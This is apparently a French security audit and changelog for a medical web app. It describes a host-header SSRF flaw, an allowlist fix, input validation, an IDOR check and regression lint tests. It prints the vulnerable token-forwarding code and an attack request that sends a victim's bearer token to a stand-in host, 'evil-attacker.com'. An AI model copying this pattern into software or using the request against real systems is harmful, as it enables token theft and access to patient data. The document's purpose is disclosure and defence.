🚨 1. Vulnérabilité SSRF / Host header injection — CVSS 7.5 HIGH

Audit sécurité de la 0.57.25 → vraie vulnérabilité trouvée dans 2 routes API.

Le problème

Les routes prescriptions/from-ocr et prescriptions/verify-rpps construisaient une URL avec req.headers.get("host") ET forwardaient le header Authorization.

// AVANT 0.57.25 - VULNÉRABLE
const proto = req.headers.get("x-forwarded-proto") || "https";
const host = req.headers.get("host") || "localhost:3000";
//         ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
//         CONTRÔLABLE PAR L'ATTAQUANT (Host header)

const verifRes = await fetch(`${proto}://${host}/api/rpps?rpps=...`, {
  headers: {
    Authorization: req.headers.get("authorization") || ""
    //             ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
    //             EXFILTRABLE VERS LE HOST MALVEILLANT
  }
});

Scénario d'attaque

# 1. L'attaquant envoie une requête avec Host header malveillant
POST /api/prescriptions/from-ocr HTTP/1.1
Host: evil-attacker.com
Authorization: Bearer eyJ...  (token Bearer Supabase de la victime)
Content-Type: application/json
{...données prescription avec rpps valide...}

# 2. Le serveur Aveho fait :
fetch('https://evil-attacker.com/api/rpps?rpps=12345', {
  headers: { Authorization: 'Bearer eyJ...' }
});

# 3. L'attaquant récupère le Bearer token de la victime
# → peut se connecter en tant que la victime
# → peut lire toutes les données médicales de sa structure

✅ Fix : lib/internalFetch.js

Nouveau helper qui whitelist les hosts autorisés AVANT de faire le fetch :

// lib/internalFetch.js
const ALLOWED_HOSTS_PATTERNS = [
  /^localhost(:\d+)?$/,
  /^127\.0\.0\.1(:\d+)?$/,
  /^aveho-ec-app\.vercel\.app$/,
  /^aveho-ec-app-[a-z0-9-]+\.vercel\.app$/,           // previews Vercel
  /^aveho-ec-app-[a-z0-9-]+-fleos-projects\.vercel\.app$/,
];

export function isAllowedInternalHost(host) {
  if (!host || typeof host !== "string") return false;
  for (const pat of ALLOWED_HOSTS_PATTERNS) {
    if (pat.test(host)) return true;
  }
  return false;
}

export function buildInternalUrl(req, path) {
  const host = req.headers.get("host");
  if (!isAllowedInternalHost(host)) {
    throw new Error(`Host header non autorisé (SSRF prevention) : ${host}`);
  }
  const proto = req.headers.get("x-forwarded-proto") || "https";
  return `${proto}://${host}${path.startsWith("/") ? path : "/" + path}`;
}

export async function internalFetch(req, path, options = {}) {
  const url = buildInternalUrl(req, path);  // ← throw si Host suspect
  const headers = {
    ...(options.headers || {}),
    Authorization: req.headers.get("authorization") || "",
  };
  return fetch(url, { ...options, headers });
}

Exemple d'utilisation

import { validate } from "../../../../lib/validateInput";

const validationErrors = validate(body, {
  patient_id:    { type: "uuid", required: true },
  structure_id:  { type: "uuid", required: true },
  etablissement_id: { type: "uuid" },               // optionnel
  data:          { type: "object", required: true },
  ocr_text_brut: { type: "string", maxLen: 50_000 },
  ocr_confiance: { type: "number", min: 0, max: 100 },
  ocr_tokens_in: { type: "number", min: 0, max: 1_000_000, integer: true },
});
if (validationErrors.length > 0) {
  return Response.json({
    ok: false,
    error: "Body invalide",
    details: validationErrors,
  }, { status: 400 });
}

Protections apportées

  • Anti-DoS : refuse les strings > 10 KB et arrays > 1000 items par défaut
  • Anti-type-confusion : impossible d'envoyer un object où on attend une string
  • Anti-IDOR par type : impossible d'envoyer "not-uuid" pour un patient_id (le format UUID est validé)
  • Rejet précoce : la BDD n'est jamais sollicitée avec des inputs invalides
  • Messages clairs : "champ 'patient_id' doit être un UUID valide" au lieu d'une erreur Postgres cryptique

🛡️ 3. IDOR check sur prescriptions/from-ocr

IDOR = Insecure Direct Object Reference. Sans check, un user de la structure A pourrait envoyer un structure_id de la structure B dans le body. Avec le RLS Supabase ça serait bloqué au moment de l'INSERT, mais c'est plus défensif d'échouer tôt avec un message clair.

// 0.57.25 - check explicite membership AVANT l'insert
const { data: membership } = await supabase
  .from("membres_structure")
  .select("structure_id")
  .eq("user_id", user.id)
  .eq("structure_id", structure_id)
  .maybeSingle();

if (!membership) {
  return Response.json(
    { ok: false, error: "Accès refusé à cette structure" },
    { status: 403 }
  );
}

Pattern defense in depth : le RLS Supabase reste la dernière barrière, mais on échoue plus tôt avec un message clair.

🔒 4. Anti-régression : 2 LINT critiques ajoutés

Pour que ces bugs ne reviennent JAMAIS :

LINT 1 : Aucune route ne fait fetch(`${host}`) direct

it("Aucune route API ne fait fetch(`${proto}://${host}` direct", () => {
  const violations = [];
  for (const f of findFiles("app/api")) {
    const src = fs.readFileSync(f, "utf-8");
    if (/fetch\(\s*`\$\{proto\}:\/\/\$\{host\}/.test(src)) {
      violations.push(f);
    }
  }
  expect(violations).toEqual([]);   // ← FAIL si SSRF revient
});

LINT 2 : Aucune route ne forward Authorization sans whitelist

it("Aucune route ne forward Authorization avec host non whitelisté", () => {
  const violations = [];
  for (const f of findFiles("app/api")) {
    const src = fs.readFileSync(f, "utf-8");
    if (
      /Authorization.*req\.headers\.get/.test(src) &&
      /req\.headers\.get\(["']host["']\)/.test(src) &&
      !/internalFetch|isAllowedInternalHost/.test(src)
    ) {
      violations.push(f);
    }
  }
  expect(violations).toEqual([]);   // ← FAIL si pattern dangereux revient
});
